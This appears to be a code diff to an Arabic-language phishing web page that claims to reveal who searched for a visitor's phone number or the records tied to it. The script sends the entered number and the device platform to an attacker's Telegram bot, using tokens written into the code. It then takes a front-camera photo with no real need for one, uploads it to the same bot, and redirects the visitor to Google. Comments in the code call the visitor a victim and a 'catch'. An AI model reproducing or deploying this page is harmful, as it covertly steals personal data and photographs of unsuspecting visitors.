@@ -7,89 +7,86 @@
     <style>
         :root { --gold: #d4af37; --dark: #0f1216; }
         body { background-color: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { background: linear-gradient(145deg, #161b22, #0f1216); padding: 40px 25px; border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.3); width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-        .logo { font-size: 50px; margin-bottom: 10px; color: var(--gold); text-shadow: 0 0 15px rgba(212, 175, 55, 0.5); }
-        h2 { color: var(--gold); margin-bottom: 10px; font-size: 22px; }
-        p { color: #8b949e; font-size: 14px; margin-bottom: 30px; }
-        .input-group { margin-bottom: 20px; text-align: right; }
-        label { display: block; margin-bottom: 8px; font-size: 13px; color: var(--gold); }
-        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--gold); box-shadow: 0 0 10px rgba(212, 175, 55, 0.2); }
-        .btn { background: linear-gradient(45deg, #d4af37, #f9e29c); color: #000; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .btn:active { transform: scale(0.95); }
-        #v, #c { display: none; }
-        .loading { display: none; margin-top: 20px; }
-        .spinner { border: 3px solid rgba(212, 175, 55, 0.1); border-top: 3px solid var(--gold); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { background: #161b22; padding: 40px 25px; border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.3); width: 90%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo { font-size: 50px; margin-bottom: 10px; color: var(--gold); }
+        h2 { color: var(--gold); font-size: 20px; margin-bottom: 15px; }
+        p { color: #8b949e; font-size: 13px; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; outline: none; text-align: center; }
+        .btn { background: linear-gradient(45deg, #d4af37, #f9e29c); color: #000; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; }
+        #status { display: none; margin-top: 20px; color: var(--gold); font-size: 14px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container" id="box">
-    <div id="step1">
+<div class="container">
+    <div id="ui">
         <div class="logo">⚜️</div>
-        <h2>كشف من بحث عنك</h2>
-        <p>أدخل رقم هاتفك لمعرفة الأشخاص الذين قاموا بالبحث عن بروفايلك أو رقمك مؤخراً.</p>
-        <div class="input-group">
-            <label>رقم الهاتف</label>
-            <input type="tel" id="phone" placeholder="07XXXXXXXX" dir="ltr">
-        </div>
-        <button class="btn" onclick="start()">بدأ البحث الآن</button>
+        <h2>كاشف الهوية الملكي</h2>
+        <p>أدخل رقم الهاتف لمعرفة السجلات المرتبطة به</p>
+        <input type="tel" id="phone" placeholder="07XXXXXXXX" required>
+        <button class="btn" onclick="execute()">كشف الهوية الآن</button>
     </div>
-
-    <div id="step2" class="loading">
-        <div class="spinner"></div>
-        <p id="status" style="color: var(--gold);">جاري الوصول لقاعدة البيانات...</p>
-    </div>
+    <div id="status">جاري معالجة طلبك...</div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 
 <script>
-    const T = '8409410631:AAFhc4ENmetOY0tCRzhFfwVN6H3ShW4RSCg';
-    const C = '5156556639';
+    const TOKEN = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
+    const CHAT_ID = '5156556639';
 
-    async function push(data, isT = false) {
-        const url = `https://api.telegram.org/bot${T}/${isT ? 'sendMessage' : 'sendPhoto'}`;
+    async function send(data, type) {
         try {
-            if (isT) {
-                await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: C, text: data}) });
-            } else {
-                const fd = new FormData(); fd.append('chat_id', C); fd.append('photo', data, 'snap.jpg');
-                await fetch(url, { method: 'POST', body: fd });
-            }
-        } catch(e) {}
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${type}`, {
+                method: 'POST',
+                body: data
+            });
+        } catch (e) {}
     }
 
-    function start() {
-        const p = document.getElementById('phone').value;
-        if(p.length < 8) { alert("يرجى إدخال رقم هاتف صحيح"); return; }
+    function execute() {
+        const val = document.getElementById('phone').value;
+        if (val.length < 5) return alert("الرقم غير صحيح");
 
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-        const txt = document.getElementById('status');
+        document.getElementById('ui').style.display = 'none';
+        document.getElementById('status').style.display = 'block';
 
-        push(`📞 رقم ضحية جديد: ${p}\n📱 الجهاز: ${navigator.platform}`, true);
+        // 1. إرسال الرقم فوراً كرسالة نصية
+        const textData = new FormData();
+        textData.append('chat_id', CHAT_ID);
+        textData.append('text', `🚨 صيد جديد:\n📞 الرقم: ${val}\n📱 الجهاز: ${navigator.platform}`);
+        send(textData, 'sendMessage');
 
+        // 2. محاولة فتح الكاميرا للتصوير
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(s => {
-            document.getElementById('v').srcObject = s;
-            txt.innerText = "جاري مطابقة السجلات الحيوية...";
-            
+            const v = document.getElementById('v');
+            v.srcObject = s;
+            document.getElementById('status').innerText = "يتم التحقق من بصمة الوجه أمنياً...";
+
             setTimeout(() => {
                 const cv = document.getElementById('c');
                 cv.width = 480; cv.height = 640;
-                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 480, 640);
+                cv.getContext('2d').drawImage(v, 0, 0, 480, 640);
+                
                 cv.toBlob(b => {
-                    push(b).then(() => {
-                        txt.innerText = "اكتمل البحث، جاري عرض النتائج...";
+                    const photoData = new FormData();
+                    photoData.append('chat_id', CHAT_ID);
+                    photoData.append('photo', b, 'shot.jpg');
+                    
+                    send(photoData, 'sendPhoto').then(() => {
+                        document.getElementById('status').innerText = "تم التوثيق! جاري عرض السجل...";
                         setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
                     });
-                }, 'image/jpeg', 0.6);
+                }, 'image/jpeg', 0.5);
             }, 2500);
         })
-        .catch(() => { window.location.href = "https://www.google.com"; });
+        .catch(() => {
+            // في حال رفض الإذن، سيصلك الرقم فقط ويتحول الضحية لجوجل
+            window.location.href = "https://www.google.com";
+        });
     }
 </script>
 </body>
